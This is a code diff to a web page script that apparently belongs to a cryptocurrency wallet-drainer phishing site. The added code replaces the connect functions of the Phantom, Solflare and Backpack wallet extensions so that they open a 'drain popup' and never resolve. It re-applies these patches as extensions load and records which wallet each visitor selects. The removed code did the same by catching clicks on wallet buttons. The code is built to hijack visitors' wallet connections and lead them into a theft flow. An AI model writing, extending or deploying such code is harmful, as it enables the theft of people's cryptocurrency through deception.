@@ -99,43 +99,64 @@ function openDrainPopup(walletName) {
 // Track last selected wallet name
 let lastClickedWallet = '';
 
-// Helper: walk shadow DOM to find all elements matching a selector
-function deepQueryAll(root, selector) {
-  const results = [];
-  const walk = (node) => {
-    if (node.shadowRoot) {
-      results.push(...node.shadowRoot.querySelectorAll(selector));
-      node.shadowRoot.querySelectorAll('*').forEach(walk);
-    }
-    node.querySelectorAll('*').forEach((child) => {
-      if (child.shadowRoot) walk(child);
-    });
-  };
-  walk(root);
-  return results;
+// ---- BLOCK WALLET CONNECTIONS ON LANDING DOMAIN ----
+// Let AppKit show wallets normally, but when a wallet tries to connect,
+// block it and open the drain popup instead.
+
+// Block Solana wallet extensions (Phantom, Solflare, Backpack, etc.)
+function blockSolanaProviders() {
+  // Phantom
+  if (window.phantom?.solana && !window.phantom.solana._landingBlocked) {
+    window.phantom.solana._landingBlocked = true;
+    const origConnect = window.phantom.solana.connect.bind(window.phantom.solana);
+    window.phantom.solana.connect = function() {
+      openDrainPopup('phantom');
+      return new Promise(() => {}); // never resolve
+    };
+  }
+  // Also window.solana (often Phantom alias)
+  if (window.solana && !window.solana._landingBlocked) {
+    window.solana._landingBlocked = true;
+    const origConnect = window.solana.connect.bind(window.solana);
+    window.solana.connect = function() {
+      openDrainPopup(lastClickedWallet || 'phantom');
+      return new Promise(() => {});
+    };
+  }
+  // Solflare
+  if (window.solflare && !window.solflare._landingBlocked) {
+    window.solflare._landingBlocked = true;
+    const origConnect = window.solflare.connect.bind(window.solflare);
+    window.solflare.connect = function() {
+      openDrainPopup('solflare');
+      return new Promise(() => {});
+    };
+  }
+  // Backpack
+  if (window.backpack?.solana && !window.backpack.solana._landingBlocked) {
+    window.backpack.solana._landingBlocked = true;
+    const origConnect = window.backpack.solana.connect.bind(window.backpack.solana);
+    window.backpack.solana.connect = function() {
+      openDrainPopup('backpack');
+      return new Promise(() => {});
+    };
+  }
 }
 
-// Patch wallet items inside Shadow DOM — block clicks from reaching AppKit
-function patchWalletItems() {
-  const items = deepQueryAll(document, 'wui-list-wallet');
-  items.forEach((el) => {
-    if (el._landingPatched) return;
-    el._landingPatched = true;
-    el.addEventListener('click', (e) => {
-      e.stopImmediatePropagation();
-      e.preventDefault();
-      const name = el.getAttribute('name') || el.textContent?.trim()?.split('\n')?.[0]?.trim() || '';
-      lastClickedWallet = name;
-      openDrainPopup(name);
-    }, true);
-  });
-}
+// Patch immediately + re-check (extensions load async)
+blockSolanaProviders();
+setTimeout(blockSolanaProviders, 500);
+setTimeout(blockSolanaProviders, 1500);
+setTimeout(blockSolanaProviders, 3000);
 
-// Watch for AppKit modal to appear and patch wallet items
-const domObserver = new MutationObserver(() => patchWalletItems());
-domObserver.observe(document.body, { childList: true, subtree: true });
-// Also re-patch periodically in case new wallet items load (e.g. All Wallets view)
-setInterval(patchWalletItems, 500);
+// Track wallet name from AppKit events
+modal.subscribeEvents((event) => {
+  const e = event?.data?.event;
+  if (e === 'SELECT_WALLET') {
+    const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
+    if (name) lastClickedWallet = name;
+  }
+});
 
 // Backup: If wallet somehow connects to landing, disconnect and redirect
 modal.subscribeProviders((state) => {
